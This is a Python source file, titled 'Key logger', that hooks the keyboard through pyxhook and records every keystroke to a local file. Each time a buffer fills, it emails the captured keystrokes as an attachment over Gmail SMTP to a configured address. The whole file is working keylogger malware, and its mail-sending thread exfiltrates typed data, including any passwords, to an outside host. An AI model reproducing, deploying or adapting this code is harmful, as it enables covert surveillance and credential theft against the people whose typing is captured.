import argparse
import datetime

import pyxhook
import time
import smtplib
import threading
import logging

from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# Setup application logging
logging.basicConfig(level=logging.DEBUG)

# Preprocessed arguments
args = None
# Running status
running = True
# Keyboard Hook manager
hookman = None
# Log file touched (using for determinate when log file must be recreated)
log_file_touched = False

# Keys buffer
keys_buffer = ''
# Chunk buffer
chunk_buffer = ''

# Keys buffer size
keys_buffer_size = 256
# Chunk buffer size
chunk_buffer_size = 1024

# Stop key
stop_key = 27

# SMTP
smtp_server = 'smtp.gmail.com'
smtp_login = ''
smtp_password = ''
send_mail_to = ''


#
#   Send mail job
#
class SendMailJob(threading.Thread):
    def __init__(self, smtp_server, smtp_login, smtp_password, send_mail_to, data):
        threading.Thread.__init__(self)
        self.smtp_server = smtp_server
        self.smtp_login = smtp_login
        self.smtp_password = smtp_password
        self.send_mail_to = send_mail_to
        self.data = data

    def run(self):
        logging.debug('run send mail job')

        try:
            server = smtplib.SMTP_SSL(self.smtp_server, 465)
            server.ehlo()
            server.login(self.smtp_login, self.smtp_password)
            server.sendmail(self.smtp_login, self.send_mail_to, self._prepare_msg())
            server.close()

            logging.debug('mail sent')
        except smtplib.SMTPException:
            logging.error('something went wrong...')

    def _prepare_msg(self):
        attachment = MIMEText(self.data)
        attachment.add_header(
            'Content-Disposition',
            'attachment',
            filename='keys-log-%s.txt' % datetime.datetime.fromtimestamp(time.time()).strftime('%Y-%m-%d %H:%M:%S')
        )

        msg = MIMEMultipart('alternative')
        msg.attach(attachment)

        return msg.as_string()


def cli():
    logging.debug('run cli preprocessor')
    parser = argparse.ArgumentParser(
        prog="Key logger",
        usage="%(prog)s [options]",
    )
    parser.add_argument(
        '--output-file',
        action='store',
        default='./log.txt',
        help='Output file for storing keys [default: ./log.txt].',
    )
    parser.add_argument(
        '--rw',
        action='store_true',
        default=False,
        help='Rewrite output log file if exists [default: false].'
    )
    return parser.parse_args()


def save_to_log(filename, data):
    global args
    global log_file_touched

    # detect is log file overwrite needs
    rewrite = args.rw and not log_file_touched

    if rewrite:
        logging.debug('log file will be overwritten')

    logging.debug('saving data to log file: %s', [filename])
    with open(filename, 'w' if rewrite else 'a') as f:
        f.write(data)
        log_file_touched = True


#
#   Using for buffering before send mail
#
def update_chunk_buffer(data):
    global chunk_buffer, chunk_buffer_size
    global smtp_login, smtp_password, smtp_server, send_mail_to

    logging.debug('updating chunk buffer')

    chunk_buffer += data

    if len(chunk_buffer) >= chunk_buffer_size:
        SendMailJob(smtp_server, smtp_login, smtp_password, send_mail_to, chunk_buffer).start()
        chunk_buffer = ''


#
#   Using for buffering before store into log file and updating chunk buffer
#
def update_keys_buffer(key):
    global args
    global keys_buffer, keys_buffer_size

    logging.debug('updating keys buffer')

    keys_buffer += key

    if len(keys_buffer) >= keys_buffer_size:
        keys_buffer += "\n"

        # Save to log file
        if args.output_file is not None:
            save_to_log(args.output_file, keys_buffer)

        update_chunk_buffer(keys_buffer)

        keys_buffer = ''


def key_pressed_handle(event):
    global running, stop_key

    logging.debug('key pressed handling. ')
    logging.debug('key event: %s', [str(event)])
    logging.debug('char: %s', [chr(event.Ascii)])

    # stop key
    if event.Ascii == stop_key:
        running = False

    update_keys_buffer(chr(event.Ascii))


def catching_keyboard():
    global hookman

    logging.debug('initialize catching keyboard')

    hookman = pyxhook.HookManager()
    hookman.KeyDown = key_pressed_handle
    hookman.HookKeyboard()
    hookman.start()


def stop():
    global hookman

    logging.debug('stopping application')

    hookman.cancel()


def main():
    global running, args

    args = cli()

    catching_keyboard()

    # Loop the application
    while running:
        time.sleep(0.1)

    stop()


if __name__ == "__main__":
    main()
